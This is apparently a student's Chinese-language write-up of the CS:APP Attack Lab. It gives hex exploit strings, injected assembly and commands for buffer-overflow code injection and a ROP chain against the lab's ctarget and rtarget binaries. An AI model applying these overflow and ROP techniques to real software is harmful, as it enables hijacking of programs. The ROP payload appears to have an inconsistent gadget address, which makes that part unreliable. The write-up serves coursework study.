# Attack Lab

> 🥝 第三章：程序的机器级表示

## Part I: Code Injection Attacks

🌼 第一部分没有栈随机化和栈only-read限制

🍌 需要输入字符，字符是实际注入代码的位表示

🍎 在进行执行时加上`-qi` ， 跳过联网，进行本地执行



## touch1

> 在getbuf函数调用后，执行touch1函数，而不是返回test

1. getbuf读入字符时， 没对长度做限制，意味着可以读入超过bufSize的字符

2. 将test函数call getbuf函数时在栈上压入的ret地址改为touch1函数的地址（0x4017c0）

3. 位表示 `bit1`

   ```text
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   c0 17 40 00 00 00 00 00
   ```

4. 通过hex2raw将bit转化为字符  `./hex2raw < bit1 > str1` 

5.  执行  `./ctarget -qi str1`

## touch2

> 相对于touch1， 需要传递给touch2参数， 参数为cookie的值

1.  🍈需要注入代码，让cookie值传递给%rdi寄存器

2.  🍀inject code `touch2_inject_code.s`

   ```assembly
   movq $0x59b997fa, %rdi # 传递cookie
   pushq $0x4017ec        # 入栈touch2函数的返回地址 
   ret					   # 执行touch2	
   ```

3. 🍂 编译inject code，并且查看对应的bit表示 

   ```
   gcc -c touch2_inject_code.s
   objdum -d touch2_inject_code.o
   ```

   ```
   # 编译后表示为
   
   0000000000000000 <.text>:
      0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
      7:   68 ec 17 40 00          push   $0x4017ec
      c:   c3                      ret 
   ```

4.  🍃将test函数的返回地址改为inject code的地址

5.  🌿inject code的地址为进入getbuf后分配栈空间后的位置 （0x5561dc78）

6.  🏵️ 位表示 `bit2`

   ```
   48 c7 c7 fa 97 b9 59 68  # inject code 
   ec 17 40 00 c3 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   78 dc 61 55 00 00 00 00 # inject code rsp position
   
   ```

7. 将位表示转化为字符 `./hex2raw < bit2 > str2` 

8. 执行  `./ctarget -qi str2`


## touch3

1.  🍈 相对于touch2，传递参数为字符指针，指向cookie存放的位置

2.  避免hexmatch函数的调用栈覆盖cookie数组的数据

3.  字符数组存放在ret的+8位置（执行完touch3后直接退出程序，不会影响其他）

4.  inject code 

   ```assembly
   movq $0x5561dca8, %rdi # 字符数组位置，相当于touch2的栈顶位置加去0x30
   push $0x4018fa   # touch3函数位置
   ret 
   ```

5. 🏵️ 位表示 `bit3`

   ```
   48 c7 c7 a8 dc 61 55 68
   fa 18 40 00 c3 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   78 dc 61 55 00 00 00 00
   35 39 62 39 39 37 66 61
   ```

6. 将位表示转化为字符 `./hex2raw < bit3 > str3` 

7. 执行  `./ctarget -qi str3`



## Part II: Return-Oriented Programming

> 🌿 具有栈随机化和栈只读限制
>
> ☘️ 只能通过程序已有代码来进行代码攻击
>
> 🍀 不断ret跳转执行代码片段

### touch2

> 和partⅠ中touch2实现的效果一样



 1. 🍉test的ret地址改为第一段gadget代码地址

 2. 🍊test的ret地址+8位置为 cookie的值

 3. 🍋test的ret地址+16位置为第二段gadget代码的值

 4. 🍌test的ret地址+24位置为touch2函数的地址

 5. 🍍gadget代码，根据已有代码可以灵活实现

    ```assembly
    popq %rax  
    ret
    
    movq %rax %rdi
    ret
    ```

 6. 🍎找出gadget代码位置

    ```assembly
    # bit表示 58 c3
    popq %rax  
    ret
    # bit表示  48 89 c7 c3
    movq %rax %rdi
    ret
    ```

 7. 🍏位表示

    ```
    39 39 39 39 39 39 39 39
    39 39 39 39 39 39 39 39
    39 39 39 39 39 39 39 39
    39 39 39 39 39 39 39 39
    39 39 39 39 39 39 39 39
    cc 19 40 00 00 00 00 00 # 第一段gadget
    fa 97 b9 59 00 00 00 00 # cookie
    cc 19 10 00 00 00 00 00 # 第二段gadget
    ec 17 40 00 00 00 00 00 # touch2
    ```

 8. 🍐将位表示转化为字符 `./hex2raw < bit4 > str4` 

9. 🍓执行  `./rtarget -qi str4`

### touch3

> 暂无精力，有机会再来

------



第一版本，完成于2024/04/06, 缺少每个touch的栈图表示